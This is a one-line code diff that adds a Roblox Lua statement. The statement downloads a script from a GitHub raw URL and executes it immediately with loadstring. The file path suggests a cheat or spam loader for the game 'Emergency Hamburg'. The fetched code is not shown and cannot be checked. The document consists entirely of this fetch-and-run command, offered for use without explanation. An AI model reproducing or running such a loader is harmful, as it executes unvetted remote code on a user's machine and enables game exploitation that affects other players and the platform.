@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/emergency-hamburg-spam7-wbzudho3o9saxo.lua"))()
